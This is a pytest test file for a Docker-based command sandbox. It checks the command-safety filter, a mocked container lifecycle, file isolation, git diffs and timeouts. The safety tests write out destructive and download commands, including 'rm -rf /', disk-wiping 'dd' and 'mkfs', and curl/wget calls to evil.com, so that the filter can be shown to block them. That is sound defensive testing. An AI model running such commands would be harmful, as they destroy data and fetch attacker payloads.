"""Tests for the Docker Execution Sandbox."""
from __future__ import annotations

import threading
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from app.core.sandbox import (
    DockerSandbox, _is_command_safe, WORKSPACE_BASE,
    CONTAINER_WORKSPACE, BLOCKED_PATTERNS,
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture()
def sandbox(tmp_path):
    """A sandbox using a tmp workspace (no real Docker)."""
    ws = tmp_path / "task_test1"
    ws.mkdir()
    s = DockerSandbox("task_test1")
    s.workspace = ws
    return s


def _mock_container():
    """Build a mock container."""
    c = MagicMock()
    c.short_id = "abc1234"

    def exec_run(cmd, stdout=True, stderr=True, stdin=False, tty=False,
                 privileged=False, user='', detach=False, stream=False,
                 socket=False, environment=None, workdir=None, demux=False):
        if cmd == ["bash", "-c", "echo hello"]:
            return (0, (b"hello\n", None))
        if cmd == ["bash", "-c", "exit 1"]:
            return (1, (None, b"error\n"))
        if isinstance(cmd, list) and len(cmd) == 3 and cmd[0] == "bash":
            script = cmd[2]
            if script == "git init":
                return (0, (b"Initialized empty Git repository\n", None))
            if "git diff" in script:
                return (0, (b"diff --git a/file.txt\n+new content\n", None))
            if "git commit" in script:
                return (0, (b"[main (root-commit)] initial\n", None))
            if "git add" in script:
                return (0, (b"", None))
            if "git config" in script:
                return (0, (b"", None))
        return (0, (b"", None))

    c.exec_run.side_effect = exec_run
    c.remove.return_value = None
    return c


@pytest.fixture()
def mock_docker():
    """Patch app.core.sandbox.docker_sdk with a mock."""
    mock_client = MagicMock()
    mock_container = _mock_container()
    mock_client.containers.run.return_value = mock_container
    mock_client.images.get.return_value = MagicMock()

    img_not_found = type("ImageNotFound", (Exception,), {})
    mock_client.errors.ImageNotFound = img_not_found

    with patch("app.core.sandbox.docker_sdk") as dm:
        dm.from_env.return_value = mock_client
        dm.errors = MagicMock()
        dm.errors.ImageNotFound = img_not_found
        yield mock_client, mock_container


# ---------------------------------------------------------------------------
# Command safety
# ---------------------------------------------------------------------------

class TestCommandSafety:

    def test_safe_commands_pass(self):
        for cmd in ["echo hello", "python main.py", "pytest tests/",
                     "ls -la", "cat file.txt", "git status"]:
            ok, reason = _is_command_safe(cmd)
            assert ok, f"Expected safe: {cmd} (reason: {reason})"

    def test_rm_rf_root_blocked(self):
        ok, reason = _is_command_safe("rm -rf /")
        assert not ok
        assert "rm -rf" in reason

    def test_rm_rf_root_star_blocked(self):
        ok, _ = _is_command_safe("rm -rf /*")
        assert not ok

    def test_mkfs_blocked(self):
        ok, _ = _is_command_safe("mkfs.ext4 /dev/sda1")
        assert not ok

    def test_dd_blocked(self):
        ok, _ = _is_command_safe("dd if=/dev/zero of=/dev/sda")
        assert not ok

    def test_eval_blocked(self):
        ok, _ = _is_command_safe("eval('import os')")
        assert not ok

    def test_exec_blocked(self):
        ok, _ = _is_command_safe('exec("import os")')
        assert not ok

    def test_docker_command_blocked(self):
        ok, _ = _is_command_safe("docker run --privileged ubuntu")
        assert not ok

    def test_curl_blocked(self):
        ok, _ = _is_command_safe("curl http://evil.com")
        assert not ok

    def test_wget_blocked(self):
        ok, _ = _is_command_safe("wget http://evil.com/payload")
        assert not ok

    def test_subprocess_blocked(self):
        ok, _ = _is_command_safe("python -c 'import subprocess'")
        assert not ok

    def test_import_ctypes_blocked(self):
        ok, _ = _is_command_safe("python -c 'import ctypes'")
        assert not ok

    def test_chroot_blocked(self):
        ok, _ = _is_command_safe("chroot /mnt")
        assert not ok

    def test_all_patterns_are_covered(self):
        assert len(BLOCKED_PATTERNS) > 20


# ---------------------------------------------------------------------------
# Container lifecycle (mocked Docker)
# ---------------------------------------------------------------------------

class TestLifecycle:

    def test_start_builds_sandbox_image_when_missing(self, tmp_path):
        """start() should build optiloop-sandbox:latest when it is absent."""
        import app.core.sandbox as sb_mod

        mock_client = MagicMock()
        mock_container = _mock_container()
        mock_client.containers.run.return_value = mock_container
        img_not_found = type("ImageNotFound", (Exception,), {})
        mock_client.images.get.side_effect = img_not_found  # get() misses

        with patch.object(sb_mod, "docker_sdk") as dm:
            dm.from_env.return_value = mock_client
            dm.errors = MagicMock()
            dm.errors.ImageNotFound = img_not_found

            s = DockerSandbox("pull_test")
            s.workspace = tmp_path / "pull_test"
            s.start()

            mock_client.images.build.assert_called_once()
            # Container runs on the locally-built sandbox tag
            assert mock_client.containers.run.call_args[0][0] == "optiloop-sandbox:latest"
            call_kwargs = mock_client.containers.run.call_args[1]
            assert call_kwargs["detach"] is True
            assert call_kwargs["mem_limit"] == "512m"
            assert call_kwargs["privileged"] is False

    def test_start_falls_back_to_pull_when_build_fails(self, tmp_path):
        """If image build raises, fall back to pulling/using the base image."""
        import app.core.sandbox as sb_mod

        mock_client = MagicMock()
        mock_container = _mock_container()
        mock_client.containers.run.return_value = mock_container
        img_not_found = type("ImageNotFound", (Exception,), {})
        mock_client.images.get.side_effect = img_not_found  # both get() calls miss
        mock_client.images.build.side_effect = Exception("build unsupported")

        with patch.object(sb_mod, "docker_sdk") as dm:
            dm.from_env.return_value = mock_client
            dm.errors = MagicMock()
            dm.errors.ImageNotFound = img_not_found

            s = DockerSandbox("fallback_test")
            s.workspace = tmp_path / "fallback_test"
            s.start()

            mock_client.images.pull.assert_called_once_with("python:3.11-slim")
            assert mock_client.containers.run.call_args[0][0] == "python:3.11-slim"

    def test_sandbox_dockerfile_installs_pytest(self):
        """The sandbox image must pre-install pytest and pytest-cov."""
        from app.core.sandbox import SANDBOX_DOCKERFILE, DOCKER_IMAGE
        assert DOCKER_IMAGE in SANDBOX_DOCKERFILE
        assert "pytest" in SANDBOX_DOCKERFILE
        assert "pytest-cov" in SANDBOX_DOCKERFILE

    def test_start_creates_container(self, mock_docker, sandbox):
        """start() should create a running container."""
        client, container = mock_docker
        sandbox.start()
        client.containers.run.assert_called_once()
        assert sandbox._container is container

    def test_run_command_before_start_raises(self, sandbox):
        with pytest.raises(RuntimeError, match="not started"):
            sandbox.run_command("echo hi")

    def test_run_blocked_command_returns_error(self, sandbox):
        sandbox._container = MagicMock()  # needs a container to pass the guard
        result = sandbox.run_command("rm -rf /")
        assert result["exit_code"] == -1
        assert "BLOCKED" in result["stderr"]
        assert result["duration_sec"] == 0.0

    def test_run_echo_command(self, mock_docker, sandbox):
        sandbox.start()
        result = sandbox.run_command("echo hello")
        assert result["exit_code"] == 0
        assert "hello" in result["stdout"]

    def test_stop_removes_workspace(self, sandbox):
        ws = sandbox.workspace
        ws.mkdir(parents=True, exist_ok=True)
        (ws / "test.txt").write_text("hello")
        assert ws.exists()

        sandbox._container = MagicMock()
        sandbox.stop()

        assert sandbox._container is None
        assert not ws.exists()

    def test_stop_with_no_container(self, sandbox):
        """stop() is safe even if container is None."""
        sandbox._container = None
        sandbox.stop()  # should not raise


# ---------------------------------------------------------------------------
# File read/write isolation
# ---------------------------------------------------------------------------

class TestFileIO:

    def test_write_and_read_file(self, sandbox):
        sandbox.write_file("hello.txt", "Hello, OptiLoop!")
        content = sandbox.read_file("hello.txt")
        assert content == "Hello, OptiLoop!"

    def test_write_nested_file(self, sandbox):
        sandbox.write_file("src/module.py", "print('hi')")
        assert sandbox.read_file("src/module.py") == "print('hi')"

    def test_read_nonexistent_raises(self, sandbox):
        with pytest.raises(FileNotFoundError, match="not found"):
            sandbox.read_file("no_such_file.txt")

    def test_overwrite_file(self, sandbox):
        sandbox.write_file("data.txt", "v1")
        sandbox.write_file("data.txt", "v2")
        assert sandbox.read_file("data.txt") == "v2"

    def test_workspace_isolation(self, sandbox):
        """Files written to workspace stay inside it."""
        sandbox.write_file("isolated.txt", "secret")
        full = sandbox.workspace / "isolated.txt"
        assert full.exists()
        assert full.read_text() == "secret"


# ---------------------------------------------------------------------------
# Git diff
# ---------------------------------------------------------------------------

class TestGitDiff:

    def test_get_diff_after_file_change(self, sandbox):
        """After writing a file, get_diff should show additions."""
        sandbox._container = _mock_container()
        sandbox.write_file("new_file.py", "print('hello')")
        diff = sandbox.get_diff()
        assert "diff --git" in diff or "+new content" in diff

    def test_get_diff_no_changes_returns_empty(self, sandbox):
        """With no changes after init, diff is empty."""
        sandbox._container = _mock_container()

        def exec_run(cmd, stdout=True, stderr=True, stdin=False, tty=False,
                     privileged=False, user='', detach=False, stream=False,
                     socket=False, environment=None, workdir=None, demux=False):
            if isinstance(cmd, list) and "git diff" in str(cmd):
                return (0, (b"", None))
            return (0, (b"", None))

        sandbox._container.exec_run.side_effect = exec_run
        diff = sandbox.get_diff()
        assert diff == ""


# ---------------------------------------------------------------------------
# DockerSandbox configuration
# ---------------------------------------------------------------------------

class TestSandboxConfig:

    def test_custom_config(self):
        s = DockerSandbox("custom_task", image="ubuntu:22.04",
                          mem_limit="256m", cpu_quota=25000)
        assert s.task_id == "custom_task"
        assert s.image == "ubuntu:22.04"
        assert s.mem_limit == "256m"
        assert s.cpu_quota == 25000

    def test_default_config(self):
        s = DockerSandbox("default_task")
        assert s.image == "python:3.11-slim"
        assert s.mem_limit == "512m"
        assert s.cpu_quota == 50000
        assert s.workspace == WORKSPACE_BASE / "default_task"


# ---------------------------------------------------------------------------
# exec_run SDK signature & timeout handling
# ---------------------------------------------------------------------------

class TestExecRunSignature:

    def test_run_command_does_not_pass_timeout_to_exec_run(self, mock_docker, sandbox):
        """exec_run must not receive the unsupported `timeout` kwarg.

        The mock's exec_run signature mirrors Docker SDK 7.2.0 exactly: it has
        no `timeout` parameter. If sandbox.run_command passed timeout=...,
        a TypeError would propagate and this test would fail.
        """
        client, container = mock_docker
        sandbox.start()
        result = sandbox.run_command("echo hello")
        assert result["exit_code"] == 0
        assert "hello" in result["stdout"]
        call_kwargs = container.exec_run.call_args.kwargs
        assert "timeout" not in call_kwargs

    def test_run_command_timeout_returns_clean_result(self, mock_docker, sandbox):
        """A command that exceeds the timeout returns a clean dict, not a hang."""
        client, container = mock_docker
        sandbox.start()

        gate = threading.Event()

        def blocked_exec_run(cmd, **kwargs):
            gate.wait(timeout=10)
            return (0, (b"", None))

        container.exec_run.side_effect = blocked_exec_run

        result = sandbox.run_command("sleep 30", timeout=0.2)
        assert result["exit_code"] == -1
        assert "timed out" in result["stderr"].lower()
        assert result["stdout"] == ""
        gate.set()  # release the background thread

    def test_run_command_normal_execution_still_works(self, mock_docker, sandbox):
        """Non-timeout path returns normal output dict."""
        client, container = mock_docker
        sandbox.start()
        result = sandbox.run_command("echo hello")
        assert result["exit_code"] == 0
        assert "hello" in result["stdout"]
        assert result["stderr"] == ""
        assert isinstance(result["duration_sec"], float)
